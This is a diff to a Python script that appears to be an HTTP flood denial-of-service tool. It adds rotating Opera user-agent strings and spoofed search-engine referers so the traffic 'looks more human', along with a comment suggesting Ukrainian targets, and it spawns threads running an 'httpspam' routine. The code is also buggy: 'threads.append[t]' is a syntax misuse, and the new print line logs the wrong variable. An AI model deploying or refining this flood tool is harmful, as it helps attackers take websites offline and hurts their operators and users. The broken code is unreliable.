@@ -33,7 +33,22 @@ useragents = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Fir
               "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
               "Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
               "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
-              "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"
+              "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
+              # opera
+              "Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)",
+              "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10",
+              "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
+              "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10",
+              "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15",
+              "Opera/9.20 (Windows NT 6.0; U; en)",
+              "Opera/5.0 (SunOS 5.8 sun4m; U) [en]",
+              "Opera/8.51 (Windows NT 5.1; U; en)",
+              "Opera/8.53 (Windows NT 5.1; U; en)",
+              "Opera/8.01 (Windows NT 5.0; U; de)",
+              "Opera/8.54 (Windows NT 5.1; U; de)",
+              "Opera/8.53 (Windows NT 5.0; U; en)",
+              "Opera/8.01 (Windows NT 5.1; U; de)",
+              "Opera/8.50 (Windows NT 5.1; U; de)"
 ]
 # make it look more human
 acceptall = [
@@ -49,10 +64,18 @@ acceptall = [
 ]
 # make it look more human by looking like a search engine
 ref = ['http://www.bing.com/search?q=',
-       'https://www.yandex.com/yandsearch?text=',
+       'http://www.yandex.com/yandsearch?text=',
        'https://duckduckgo.com/?q=',
-       'https://google.com/search?q='
+       'https://google.com/search?q=',
+       'http://www.ted.com/search?q=',
+       'http://www.reddit.com/search?q=',
+       'http://google.ca/search?q=',
+       'http://ask.com/web?q=',
+       'http://en.wikipedia.org/w/index.php?search=',
+       # for ukraine
+       'http://google.ua/search?q='
 ]
+# ua for ukraine
 ua = "User-Agent: " + random.choice(useragents) + "\r\n"
 accept = random.choice(acceptall)
 reffer = "Referer: " + random.choice(ref) + url + "\r\n"
@@ -74,6 +97,7 @@ threads = []
 # threading
 for i in range(tn):
   t = threading.Thread(target=httpspam)
+  print("[+] Thread {0} created".format(str(tn)))
   t.daemon = True
   threads.append[t]
 for i in range(tn):
